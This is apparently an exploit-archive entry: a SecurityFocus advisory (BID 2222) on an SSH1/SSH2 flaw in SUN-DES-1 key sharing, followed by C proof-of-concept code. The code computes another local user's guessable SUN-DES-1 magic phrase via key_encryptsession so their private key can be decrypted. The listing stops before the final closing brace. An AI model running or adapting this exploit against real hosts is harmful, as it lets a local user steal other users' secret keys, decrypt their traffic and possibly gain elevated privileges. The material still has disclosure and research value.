// source: https://www.securityfocus.com/bid/2222/info

SSH is a package designed to encrypt traffic between two end points using the IETF specified SSH protocol. The SSH1 package is distributed and maintained by SSH Communications Security.

A problem exists which could allow the discovery of the secret key used to encrypt traffic on the local host. When using SUN-DES-1 to share keys with other hosts on the network to facilitate secure communication via protocols such as NFS and NIS+, the keys are shared between hosts using the private key of the user and a cryptographic algorithm to secure the contents of the key, which is stored on the NIS+ primary. The problem occurs when the key is encrypted with the SUN-DES-1 magic phrase prior to having done a keylogin (the keyserv does not have the users DH private key). A design flaw in the software that shares the key with the NIS+ master will inconsistently return the correct value for an attempted keyshare that has failed. A step in the private key encryption process is skipped, and the users private key is then encrypted only with the public key of the target server and the SUN-DES-1 magic phrase, a phrase that is guessable due to the way it is generated. A user from the same host can then execute a function that returns another users magic phrase, and use this to decrypt the private key of the victim. This makes it possible for a user with malicious intent to gain knowledge of a users secret key, and decrypt sensitive traffic between two hosts, with the possibility of gaining access and elevated privileges on the hosts and/or NIS+ domain. This reportedly affects the SSH2 series of the software package.

#include <stdio.h>
#include <rpc/rpc.h>

void die (char *msg)
{
  fprintf(stderr,"%s\n",msg);
  exit(1);
}

main (int argc, char **argv)
{
  char buf[MAXNETNAMELEN + 1];
  des_block block;
  uid_t uid;
  char *netname;

  if (argc < 3)
    die("supply uid and netname");

  sscanf(argv[1], "%d", &uid);
  netname = argv[2];
  memset(buf, 0, sizeof(buf));
  snprintf(buf, sizeof(buf), "ssh.%04X", uid);
  memcpy(block.c, buf, sizeof(block.c));
  if (key_encryptsession(netname, &block) != 0)
    die("key_encryptsession failed");
  printf("SUN-DES-1 magic phrase (uid %d, netname %s):\n  %08X%08X\n",
         uid,
         netname,
         ntohl(block.key.high),
         ntohl(block.key.low));